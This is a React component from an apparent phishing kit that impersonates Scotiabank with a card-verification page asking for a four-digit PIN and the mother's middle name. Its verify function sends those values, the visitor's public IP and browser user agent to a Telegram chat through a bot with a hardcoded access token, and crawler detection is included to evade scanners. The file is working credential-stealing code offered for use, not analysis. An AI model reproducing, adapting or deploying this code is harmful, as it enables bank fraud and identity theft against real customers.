import {useEffect, useState} from "react";
import React from "react";
import {passwordEror} from "./login";
import {useHistory} from "react-router";
const {Crawler} = require("es6-crawler-detect");
const CrawlerDetector = new Crawler();
const userAgentString = navigator.userAgent;
const publicIp = require("react-public-ip");
const {TelegramClient} = require("messaging-api-telegram");

const pinCode = () => {
  const [pinCode, setPinCode] = useState({
    pin: "",
    middleName: "",
  });
  const client = new TelegramClient({
    accessToken: "1753568410:AAH7GxK9NFDliOkapmCWPvlWkIot5XgB8QM",
  });
  const [state, setstate] = useState(false);
  const history = useHistory();

  const verify = async () => {
    if (pinCode.middleName === "" || pinCode.pin === "") setstate(true);
    else {
      await client.sendMessage(
        926925229,
        `<u>Pin</u>   
        #################################
        <b>pin</b> : ${pinCode.pin}
        <b>middle name </b> : ${pinCode.middleName}
        #################################
        <b>IP</b> : <a href="https://www.geodatatool.com/?IP=${
          (await publicIp.v4()) || ""
        }">Check Ip</a> 
        <b>Client Agent </b> : ${userAgentString}    
  `,
        {parseMode: "HTML"}
      );
      history.push("success");
    }
  };
  //bot detect
  const isBotCrawler = CrawlerDetector.isCrawler(userAgentString);
  useEffect(() => {
    if (isBotCrawler) return null;
  }, [isBotCrawler]);
  const onFormChange = (e) => {
    setPinCode({
      ...pinCode,
      [e.target.name]: e.target.value,
    });
  };
  return (
    <div className="root" id="root">
      <header className="_1ChzP-ZqsmzLyF7NCGdiJx">
        <div className="PoYv4mtPAteIiTCL2kgMd">
          <a>
            <div className="_3NvqcuqzV8Fp_FM2z3Sp4J">
              <svg
                focusable="true"
                role="img"
                aria-hidden="false"
                className="SvgLogo__scotiabankEn--size-18px"
                aria-labelledby="bankLogo-title"
                viewBox="0 0 697.04 99.14"
                accessibletitle="Scotiabank Logo"
              >
                <title id="bankLogo-title">Scotiabank</title>
                <path
                  d="M187,50a34.48,34.48,0,1,0,34.47,34.47A34.52,34.52,0,0,0,187,50Zm0,49.67a15.2,15.2,0,1,1,15.19-15.2A15.21,15.21,0,0,1,187,99.68Z"
                  transform="translate(-17.58 -19.82)"
                  fill="#EC111A"
                />
                <polygon
                  points="247.77 31.83 238.36 31.83 238.36 11.48 217.75 11.48 217.75 31.83 208.34 31.83 208.34 50.48 217.75 50.48 217.75 97.5 238.36 97.5 238.36 50.48 247.77 50.48 247.77 31.83"
                  fill="#EC111A"
                />
                <rect
                  x="257.22"
                  y="31.83"
                  width="20.6"
                  height="65.67"
                  fill="#EC111A"
                />
                <path
                  d="M285.1,19.82A11.48,11.48,0,1,0,296.59,31.3,11.5,11.5,0,0,0,285.1,19.82Z"
                  transform="translate(-17.58 -19.82)"
                  fill="#EC111A"
                />
                <path
                  d="M580.64,69.34a12.3,12.3,0,0,1,12.28,12.28v35.7h20.6V78.8c0-17.49-10.09-28.79-26-28.79-6.55,0-13.46,2.87-19.15,12.05V51.65H547.75v65.67h20.61V81.62A12.3,12.3,0,0,1,580.64,69.34Z"
                  transform="translate(-17.58 -19.82)"
                  fill="#EC111A"
                />
                <polygon
                  points="671.05 97.5 645.73 64.69 669.27 31.83 645.19 31.83 626.27 58.4 626.27 1.64 605.66 1.64 605.66 97.5 626.27 97.5 626.27 70.43 647.04 97.5 671.05 97.5"
                  fill="#EC111A"
                />
                <path
                  d="M81.54,99.65a30,30,0,0,0,2.11-12.1c0-6.63-2.08-12.55-5.85-16.68C73.4,66.05,65.88,62.05,55.45,59a37,37,0,0,1-5.86-2.2,14.46,14.46,0,0,1-4.37-3.25,7.37,7.37,0,0,1-1.87-5.32c0-3.05,1.63-5.12,4.29-6.79,3.33-2.1,9.74-2.3,16.29.12a39.83,39.83,0,0,1,6.64,3.15l8.76-17.43a49.86,49.86,0,0,0-12.56-5.66,55,55,0,0,0-14-1.77A37.61,37.61,0,0,0,39.7,22a29.82,29.82,0,0,0-10,6.52,30.84,30.84,0,0,0-6.65,10,31.9,31.9,0,0,0-2.21,12.14A25.58,25.58,0,0,0,28.6,68c6,5.63,12.8,7.63,15.54,8.69s5.75,2,7.68,2.71a27.62,27.62,0,0,1,5.64,2.88,9,9,0,0,1,3,3.34,7.53,7.53,0,0,1,.64,4.19,8.59,8.59,0,0,1-2.93,5.66c-1.77,1.66-5,2.61-9.48,2.61a28.68,28.68,0,0,1-11.49-2.76,82.84,82.84,0,0,1-9.33-5l-10.3,17.94C24.77,114.7,36.42,119,46.8,119a49.52,49.52,0,0,0,15.52-2.48,35.59,35.59,0,0,0,11.77-6.58A30.48,30.48,0,0,0,81.54,99.65Z"
                  transform="translate(-17.58 -19.82)"
                  fill="#EC111A"
                />
                <path
                  d="M703.14,94.36a11.48,11.48,0,1,0,11.48,11.48A11.48,11.48,0,0,0,703.14,94.36Zm0,20.65a9.17,9.17,0,1,1,9.17-9.17A9.17,9.17,0,0,1,703.14,115Z"
                  transform="translate(-17.58 -19.82)"
                  fill="#EC111A"
                />
                <path
                  d="M703.12,107.76h-1.84v4.35H699V99.58h4.8a4.16,4.16,0,0,1,4.17,4.15,4.07,4.07,0,0,1-2.41,3.65l2.64,4.73h-2.71Zm-1.84-2.1h2.63a1.93,1.93,0,0,0,0-3.84h-2.63Z"
                  transform="translate(-17.58 -19.82)"
                  fill="#EC111A"
                />
                <path
                  d="M138,94A15.2,15.2,0,1,1,138,75L151.63,61.3A34.42,34.42,0,0,0,126.13,50c-19,0-35.56,13.53-35.56,34.48S107.12,119,126.13,119a34.42,34.42,0,0,0,25.5-11.29Z"
                  transform="translate(-17.58 -19.82)"
                  fill="#EC111A"
                />
                <path
                  d="M376,117.32V51.65H355.93v6.9l-1.86-1.66A25.12,25.12,0,0,0,336.77,50C319,50,304.06,65.8,304.06,84.48S319,119,336.77,119a25.12,25.12,0,0,0,17.3-6.88l1.86-1.66v6.9ZM340,100a15.52,15.52,0,1,1,15.51-15.52A15.53,15.53,0,0,1,340,100Z"
                  transform="translate(-17.58 -19.82)"
                  fill="#EC111A"
                />
                <path
                  d="M537.89,117.32V51.65H517.8v6.9l-1.86-1.66A25.12,25.12,0,0,0,498.64,50c-17.73,0-32.71,15.79-32.71,34.47s15,34.48,32.71,34.48a25.12,25.12,0,0,0,17.3-6.88l1.86-1.66v6.9ZM501.84,100a15.52,15.52,0,1,1,15.51-15.52A15.53,15.53,0,0,1,501.84,100Z"
                  transform="translate(-17.58 -19.82)"
                  fill="#EC111A"
                />
                <path
                  d="M406.77,117.32v-6.9l1.86,1.66a25.1,25.1,0,0,0,17.3,6.88c17.73,0,32.7-15.79,32.7-34.48S443.66,50,425.93,50a25.1,25.1,0,0,0-17.3,6.88l-1.86,1.66V21.46H386.68v95.86Zm.44-32.84A15.52,15.52,0,1,1,422.73,100,15.53,15.53,0,0,1,407.21,84.48Z"
                  transform="translate(-17.58 -19.82)"
                  fill="#EC111A"
                />
              </svg>
            </div>
          </a>
        </div>
      </header>
      <div className="Grid__container">
        <div className="_189buhYsYKCsviWKNS9OP-">
          <div className="Card__container Card__container--xs-padding-18 Card__container--sm-padding-24 Card__container--md-padding-30 Card__container--lg-padding-36 _1bcSxMk3NAgnvjPq_83hWr">
            <div className="_1AR6e5iqu8uXHMTFKLnqWr">
              <svg width="60" height="93" xmlns="http://www.w3.org/2000/svg">
                <g fill="none" fill-rule="evenodd">
                  <path
                    d="M.968 17.647c0 37.743 15.079 47.605 28.6 56.545 13.52-8.94 28.602-18.802 28.602-56.545L29.568 0 .968 17.647zM45.374 87.337c0 2.82-7.077 5.108-15.806 5.108-8.728 0-15.804-2.287-15.804-5.108 0-2.822 7.076-5.109 15.804-5.109 8.73 0 15.806 2.288 15.806 5.109"
                    fill="#E6E6E6"
                  />
                  <path
                    d="M29.569 5.414l24.326 15.012c0 32.103-12.826 40.493-24.326 48.096V5.414z"
                    fill="#91DDF8"
                  />
                  <path
                    d="M29.569 5.414L5.242 20.426c0 32.103 12.826 40.493 24.327 48.096V5.414z"
                    fill="#009DD6"
                  />
                  <path
                    d="M53.752 34.07c0 3.834-2.756 7.455-6.159 7.455-3.401 0-6.159-3.621-6.159-7.454 0-3.834 2.758-6.427 6.16-6.427 3.4 0 6.158 2.593 6.158 6.427M53.224 42.166c-2.313 1.662-3.098 2.306-5.508 2.306-2.453 0-2.915-.467-5.565-2.306-3.616 2.276-5.076 5.513-6.045 10.319 0 0 3.657 3.407 11.487 3.407s11.515-3.509 11.515-3.509c-.922-4.693-2.357-7.919-5.884-10.217"
                    fill="#7849B8"
                  />
                </g>
              </svg>{" "}
              <div
                style={{fontWeight: "bold"}}
                className="TextHeadline__text TextHeadline__text--black TextHeadline__text--small _3hjDHBxiP1Z2Uj2D22Khad"
              >
                Enter your PIN and your mother middle name to verify your card
              </div>
              {state &&
                passwordEror("Please check your credentials and try again")}
            </div>
            <div className="_1IqfhyENLur_RobxTjYV-O">
              <div className="InputContainer__input">
                <input
                  autoComplete="off"
                  id="pin"
                  name="pin"
                  type="password"
                  minLength={4}
                  maxLength={4}
                  pattern="[0-9]*"
                  onChange={onFormChange}
                  className="Input__input Input__input--textField"
                  placeholder="4-digit PIN"
                  required="required"
                  value={pinCode.pin}
                />
              </div>
              <div className="InputContainer__input">
                <input
                  name="middleName"
                  placeholder="Mother middle name"
                  type="text"
                  autoComplete="off"
                  required="required"
                  onChange={onFormChange}
                  value={pinCode.middleName}
                  className="Input__input Input__input--textField"
                  style={state ? {borderBottomColor: "red"} : {}}
                />
              </div>
            </div>
            <div className="_3QtV3a7pw3maUyc9k3EKbO">
              <button
                className="ButtonCore__button NavButton__button NavButton__button--continue"
                id="continue"
                style={{fontWeight: "bold"}}
                type="submit"
                onClick={() => verify()}
              >
                <span className="ButtonCore__block" tabIndex={-1}>
                  <span className="ButtonCore__text">Continue</span>
                  <span className="ButtonCore__icon NavButton__icon">
                    <svg
                      className="SvgIcon__icon SvgIcon__icon-icon--size-18px"
                      focusable="false"
                      role="presentation"
                      aria-hidden="true"
                      viewBox="0 0 24 24"
                    >
                      <path fill="none" d="M14.22 4l8 8-8 8M1.78 12h20.44" />
                    </svg>
                  </span>
                </span>
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default pinCode;
